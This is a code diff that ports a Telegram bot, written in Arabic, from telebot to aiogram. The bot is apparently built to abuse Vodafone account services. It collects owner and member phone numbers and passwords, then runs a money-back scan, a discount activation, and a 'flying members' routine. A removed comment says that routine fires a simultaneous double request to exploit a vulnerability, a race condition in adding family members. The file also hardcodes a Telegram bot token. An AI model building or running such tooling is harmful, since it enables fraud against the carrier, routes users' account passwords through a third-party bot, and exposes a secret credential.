@@ -1,163 +1,139 @@
-import telebot
-from telebot import types
-import engine
 import asyncio
-import aiohttp
 import os
 import threading
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
+import aiohttp
+import engine
 
-# 1. إعداد سيرفر Flask للبقاء مستيقظاً على Render
+# --- سيرفر Flask للبقاء مستيقظاً ---
 app = Flask(__name__)
-
 @app.route('/')
-def home():
-    return "VF Family Bot is Active!"
+def home(): return "Bot is Alive"
 
-def run_web():
+def run_flask():
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
-# 2. إعداد البوت
+# --- إعدادات البوت (Aiogram 3) ---
 TOKEN = '8220448877:AAF8mDyfUgnUWKX5B3VBozRz6Yjac5a34SQ'
-bot = telebot.TeleBot(TOKEN)
-user_data = {}
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
 
-def main_markup():
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("💰 ماني باك", callback_data='MB'),
-        types.InlineKeyboardButton("🎁 خصم فليكس", callback_data='FLX'),
-        types.InlineKeyboardButton("🚀 تطيير أفراد", callback_data='F_FLY'),
-        types.InlineKeyboardButton("🔄 إعادة تشغيل", callback_data='START')
-    )
-    return markup
+class Form(StatesGroup):
+    waiting_for_num = State()
+    waiting_for_pwd = State()
+    waiting_for_m_num = State()
+    waiting_for_m_pwd = State()
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.send_message(message.chat.id, "💎 **بوت خدمات فودافون (نسخة ريندر النهائية)**\nاختر الخدمة المطلوبة:", 
-                     reply_markup=main_markup(), parse_mode='Markdown')
+def main_kb():
+    buttons = [
+        [InlineKeyboardButton(text="💰 ماني باك", callback_data="op_MB"),
+         InlineKeyboardButton(text="🎁 خصم فليكس", callback_data="op_FLX")],
+        [InlineKeyboardButton(text="🚀 تطيير أفراد", callback_data="op_FLY")],
+        [InlineKeyboardButton(text="🔄 إعادة تشغيل", callback_data="start_over")]
+    ]
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_query(call):
-    chat_id = call.message.chat.id
-    if call.data == 'START':
-        bot.edit_message_text("تمت إعادة التشغيل. اختر خدمة:", chat_id, call.message.message_id, reply_markup=main_markup())
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    await message.answer("💎 **بوت فودافون المتطور (نسخة Aiogram)**\nاختر الخدمة:", reply_markup=main_kb(), parse_mode="Markdown")
+
+@dp.callback_query(F.data.startswith("op_"))
+async def process_op(callback: types.CallbackQuery, state: FSMContext):
+    op = callback.data.split("_")[1]
+    await state.update_data(op=op)
     
-    elif call.data == 'MB':
-        user_data[chat_id] = {'op': 'MB'}
-        msg = bot.send_message(chat_id, "📱 أرسل رقم الهاتف المراد فحصه:")
-        bot.register_next_step_handler(msg, get_num)
-        
-    elif call.data == 'FLX':
-        user_data[chat_id] = {'op': 'FLX'}
-        markup = types.InlineKeyboardMarkup()
-        for k, v in engine.PACKAGES.items():
-            markup.add(types.InlineKeyboardButton(v['desc'], callback_data=f"PKG_{k}"))
-        bot.edit_message_text("🎁 اختر باقة الخصم:", chat_id, call.message.message_id, reply_markup=markup)
-
-    elif call.data.startswith('PKG_'):
-        user_data[chat_id]['pkg'] = call.data.split('_')[1]
-        msg = bot.send_message(chat_id, "📱 أرسل رقم الهاتف:")
-        bot.register_next_step_handler(msg, get_num)
-
-    elif call.data == 'F_FLY':
-        user_data[chat_id] = {'op': 'FLY'}
-        msg = bot.send_message(chat_id, "👤 أرسل رقم المالك (Owner):")
-        bot.register_next_step_handler(msg, get_num)
-
-# --- تسلسل إدخال البيانات ---
-def get_num(message):
-    chat_id = message.chat.id
-    user_data[chat_id]['num'] = message.text
-    msg = bot.send_message(chat_id, "🔑 أرسل كلمة مرور المالك:")
-    bot.register_next_step_handler(msg, get_pwd)
-
-def get_pwd(message):
-    chat_id = message.chat.id
-    user_data[chat_id]['pwd'] = message.text
-    ud = user_data[chat_id]
-    if ud['op'] == 'FLY':
-        msg = bot.send_message(chat_id, "👥 أرسل رقم العضو (Member):")
-        bot.register_next_step_handler(msg, get_m_num)
+    if op == "FLX":
+        buttons = [[InlineKeyboardButton(text=v['desc'], callback_data=f"pkg_{k}")] for k, v in engine.PACKAGES.items()]
+        await callback.message.edit_text("🎁 اختر باقة الخصم:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
     else:
-        execute_process(message)
+        await callback.message.answer("📱 أرسل رقم المالك (Owner):")
+        await state.set_state(Form.waiting_for_num)
 
-def get_m_num(message):
-    chat_id = message.chat.id
-    user_data[chat_id]['m_num'] = message.text
-    msg = bot.send_message(chat_id, "🔑 أرسل كلمة مرور العضو:")
-    bot.register_next_step_handler(msg, get_m_pwd)
+@dp.callback_query(F.data.startswith("pkg_"))
+async def process_pkg(callback: types.CallbackQuery, state: FSMContext):
+    pkg = callback.data.split("_")[1]
+    await state.update_data(pkg=pkg)
+    await callback.message.answer("📱 أرسل رقم الهاتف:")
+    await state.set_state(Form.waiting_for_num)
 
-def get_m_pwd(message):
-    chat_id = message.chat.id
-    user_data[chat_id]['m_pwd'] = message.text
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("10%", callback_data='Q_10'), 
-               types.InlineKeyboardButton("20%", callback_data='Q_20'),
-               types.InlineKeyboardButton("40%", callback_data='Q_40'))
-    bot.send_message(chat_id, "📊 اختر نسبة الحصة المطلوبة للتطيير:", reply_markup=markup)
+@dp.message(Form.waiting_for_num)
+async def get_num(message: types.Message, state: FSMContext):
+    await state.update_data(num=message.text)
+    await message.answer("🔑 أرسل كلمة المرور:")
+    await state.set_state(Form.waiting_for_pwd)
 
-# --- حل مشكلة الاستجابة بعد الضغط على النسبة ---
-@bot.callback_query_handler(func=lambda call: call.data.startswith('Q_'))
-def set_quota_and_fly(call):
-    chat_id = call.message.chat.id
-    user_data[chat_id]['quota'] = call.data.split('_')[1]
-    bot.answer_callback_query(call.id, "🚀 جاري بدء عملية التطيير المتزامن...")
+@dp.message(Form.waiting_for_pwd)
+async def get_pwd(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    await state.update_data(pwd=message.text)
     
-    # تشغيل المهمة في خيط منفصل (Thread) لمنع تجمد البوت
-    def thread_task():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(run_flying_async(chat_id))
-        loop.close()
+    if data['op'] == 'FLY':
+        await message.answer("👥 أرسل رقم العضو (Member):")
+        await state.set_state(Form.waiting_for_m_num)
+    else:
+        await execute_simple_op(message, state)
 
-    threading.Thread(target=thread_task, daemon=True).start()
+@dp.message(Form.waiting_for_m_num)
+async def get_m_num(message: types.Message, state: FSMContext):
+    await state.update_data(m_num=message.text)
+    await message.answer("🔑 أرسل كلمة مرور العضو:")
+    await state.set_state(Form.waiting_for_m_pwd)
 
-# --- التنفيذ الفعلي ---
-def execute_process(message):
-    chat_id = message.chat.id
-    ud = user_data[chat_id]
-    prog = bot.send_message(chat_id, "⏳ جاري تنفيذ الطلب...")
-    try:
-        token = engine.get_token(ud['num'], ud['pwd'])
-        if ud['op'] == 'MB':
-            res = engine.run_money_back_scan(ud['num'], token)
-            bot.edit_message_text(f"💰 رصيد الماني باك المتاح: {res} جنيه", chat_id, prog.message_id)
-        elif ud['op'] == 'FLX':
-            res = engine.execute_flex_discount(ud['num'], token, ud['pkg'])
-            bot.edit_message_text("✅ تم تفعيل الخصم بنجاح!" if res else "❌ فشل التفعيل أو الخط غير مؤهل", chat_id, prog.message_id)
-    except Exception as e:
-        bot.edit_message_text(f"⚠️ خطأ: {str(e)}", chat_id, prog.message_id)
+@dp.message(Form.waiting_for_m_pwd)
+async def get_m_pwd(message: types.Message, state: FSMContext):
+    await state.update_data(m_pwd=message.text)
+    buttons = [
+        [InlineKeyboardButton(text="10%", callback_data="q_10"),
+         InlineKeyboardButton(text="20%", callback_data="q_20"),
+         InlineKeyboardButton(text="40%", callback_data="q_40")]
+    ]
+    await message.answer("📊 اختر نسبة الحصة:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
-async def run_flying_async(chat_id):
-    ud = user_data[chat_id]
-    status = bot.send_message(chat_id, "🚀 جاري الإرسال المزدوج (A/B) بسرعة...")
+@dp.callback_query(F.data.startswith("q_"))
+async def final_fly(callback: types.CallbackQuery, state: FSMContext):
+    quota = callback.data.split("_")[1]
+    data = await state.get_data()
+    await callback.message.edit_text("🚀 جاري التطيير المتزامن... انتظر لحظة.")
     
     async with aiohttp.ClientSession() as session:
-        o_token = await engine.get_token_async(session, ud['num'], ud['pwd'])
-        m_token = await engine.get_token_async(session, ud['m_num'], ud['m_pwd'])
+        o_t = await engine.get_token_async(session, data['num'], data['pwd'])
+        m_t = await engine.get_token_async(session, data['m_num'], data['m_pwd'])
         
-        if not o_token or not m_token:
-            bot.edit_message_text("❌ فشل جلب التوكنات. تأكد من البيانات.", chat_id, status.message_id)
-            return
+        if o_t and m_t:
+            tasks = [engine.add_member_async(session, o_t, data['num'], data['m_num'], quota) for _ in range(2)]
+            results = await asyncio.gather(*tasks)
+            if any(results):
+                await asyncio.sleep(5)
+                if await engine.accept_invitation_async(session, data['num'], data['m_num'], m_t):
+                    await callback.message.answer("🎉 تم التطيير بنجاح عبر Aiogram!")
+                else: await callback.message.answer("❌ فشل القبول التلقائي.")
+            else: await callback.message.answer("❌ فشل الإرسال المزدوج.")
+        else: await callback.message.answer("❌ خطأ في التوكنات.")
+    await state.clear()
 
-        # الطلب المزدوج المتزامن للثغرة
-        tasks = [engine.add_member_async(session, o_token, ud['num'], ud['m_num'], ud['quota']) for _ in range(2)]
-        results = await asyncio.gather(*tasks)
-        
-        if any(results):
-            bot.edit_message_text("⚡ نجح الإرسال المزدوج! جاري محاولة القبول...", chat_id, status.message_id)
-            await asyncio.sleep(6) # انتظار بسيط لضمان المعالجة
-            if await engine.accept_invitation_async(session, ud['num'], ud['m_num'], m_token):
-                bot.edit_message_text("🎉 **تم التطيير بنجاح!**\nانتظر ساعة وسيظهر الفرد في المجموعة.", chat_id, status.message_id, parse_mode='Markdown')
-            else:
-                bot.edit_message_text("❌ نجح الإرسال وفشل القبول التلقائي. جرب القبول اليدوي.", chat_id, status.message_id)
-        else:
-            bot.edit_message_text("❌ فشل الإرسال المتزامن. جرب مرة أخرى.", chat_id, status.message_id)
+async def execute_simple_op(message, state):
+    data = await state.get_data()
+    msg = await message.answer("⏳ جاري المعالجة...")
+    try:
+        token = engine.get_token(data['num'], data['pwd'])
+        if data['op'] == 'MB':
+            res = engine.run_money_back_scan(data['num'], token)
+            await msg.edit_text(f"💰 رصيد الماني باك: {res}")
+        elif data['op'] == 'FLX':
+            res = engine.execute_flex_discount(data['num'], token, data['pkg'])
+            await msg.edit_text("✅ تم التفعيل!" if res else "❌ غير مؤهل")
+    except Exception as e: await msg.edit_text(f"⚠️ خطأ: {e}")
+    await state.clear()
+
+async def main():
+    threading.Thread(target=run_flask, daemon=True).start()
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    # تشغيل السيرفر في الخلفية للبقاء في الخطة المجانية
-    threading.Thread(target=run_web, daemon=True).start()
-    print("Bot and Web Server Started!")
-    bot.infinity_polling()
+    asyncio.run(main())
